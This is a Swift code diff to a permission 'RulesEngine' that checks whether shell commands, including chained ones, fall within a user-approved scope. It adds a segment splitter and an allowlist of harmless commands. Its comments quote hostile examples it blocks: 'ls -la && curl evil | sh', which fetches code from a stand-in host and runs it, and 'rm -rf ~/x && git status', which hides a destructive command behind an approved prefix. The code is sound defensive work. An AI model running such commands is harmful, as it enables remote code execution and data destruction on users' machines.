@@ -97,10 +97,22 @@ final class RulesEngine {
         // The exact command the user approved always matches.
         if cleanCmd == pattern { return true }
 
-        // Everything broader is refused for high-risk requests and for compound shell commands,
-        // where an approved prefix could smuggle in more ("ls -la && curl evil | sh", or
-        // "rm -rf ~/x && git status", whose family would otherwise look like "git").
-        guard risk != .high, !RulesEngine.isCompoundShell(cleanCmd) else { return false }
+        // Everything broader is refused for high-risk requests.
+        guard risk != .high else { return false }
+
+        // Chained commands ("cd src && npm test", "git log | head") match only if every part is
+        // covered on its own: each real command by this scope, plus harmless glue (cd into a
+        // sub-folder, read-only filters). Substitution/redirection is never auto-approved, so an
+        // approved prefix cannot smuggle in more ("ls -la && curl evil | sh").
+        if RulesEngine.isCompoundShell(cleanCmd) {
+            guard let segments = RulesEngine.chainSegments(cleanCmd) else { return false }
+            let real = segments.filter { !RulesEngine.isHarmlessSegment($0) }
+            return !real.isEmpty && real.allSatisfy { seg in
+                matchesScope(pattern: pattern, family: scopeFamily, directory: directory,
+                             command: seg, family: toolFamily(for: seg), isFileMod: false,
+                             requestDir: requestDir, risk: risk)
+            }
+        }
 
         let isFamilyScope = scopeFamily != nil || pattern == "file_mod" || pattern == "workspace"
             || RulesEngine.knownToolFamilies.contains(pattern)
@@ -123,6 +135,33 @@ final class RulesEngine {
     static func isCompoundShell(_ command: String) -> Bool {
         let ops = ["&&", "||", ";", "|", "`", "$(", ">", "<", "\n", "&"]
         return ops.contains { command.contains($0) }
+    }
+
+    /// Splits `a && b || c ; d | e` into its commands, or nil when it uses anything that is never
+    /// auto-approved: substitution, backticks, redirection, newlines or background `&`.
+    static func chainSegments(_ command: String) -> [String]? {
+        for banned in ["`", "$(", ">", "<", "\n"] where command.contains(banned) { return nil }
+        let withoutAnd = command.replacingOccurrences(of: "&&", with: "")
+        if withoutAnd.contains("&") { return nil }
+        var parts = [command]
+        for sep in ["&&", "||", ";", "|"] {
+            parts = parts.flatMap { $0.components(separatedBy: sep) }
+        }
+        let segments = parts.map { $0.trimmingCharacters(in: .whitespaces) }
+        return segments.contains(where: \.isEmpty) ? nil : segments
+    }
+
+    /// Glue that cannot do harm on its own: `cd` into a sub-folder, or a read-only text filter.
+    static func isHarmlessSegment(_ segment: String) -> Bool {
+        let words = segment.split(separator: " ").map(String.init)
+        guard let first = words.first else { return false }
+        if first == "cd" {
+            guard words.count == 2 else { return false }
+            let target = words[1]
+            return !target.hasPrefix("/") && !target.hasPrefix("~") && !target.hasPrefix("$")
+                && !target.hasPrefix("-") && !target.split(separator: "/").contains("..")
+        }
+        return ["head", "tail", "grep", "wc", "cut", "tr", "jq", "nl", "column", "pwd", "echo", "true"].contains(first)
     }
 
     func toolFamily(for command: String) -> String {
@@ -303,11 +342,10 @@ final class RulesEngine {
     }
 
     func cleanupExpired() {
-        let initialCount = activeGrants.count
+        // Runs every second: only mutate (and so invalidate SwiftUI views) when a grant expired.
+        guard activeGrants.contains(where: { $0.isExpired }) else { return }
         activeGrants.removeAll { $0.isExpired }
-        if activeGrants.count != initialCount {
-            saveToDisk()
-        }
+        saveToDisk()
     }
 
     // MARK: - Cryptographic Chain Verification
